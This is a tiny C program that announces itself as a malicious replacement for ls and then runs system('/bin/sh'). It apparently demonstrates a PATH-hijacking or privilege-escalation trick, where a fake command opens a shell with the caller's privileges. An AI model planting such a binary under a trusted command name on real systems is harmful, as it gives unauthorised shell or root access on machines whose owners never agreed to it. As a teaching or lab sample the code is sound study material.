#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("I am a malicious version of ls!!!!\n");
	printf("I will now spawn a root shell!\n");
	system("/bin/sh");
	return 0;
}
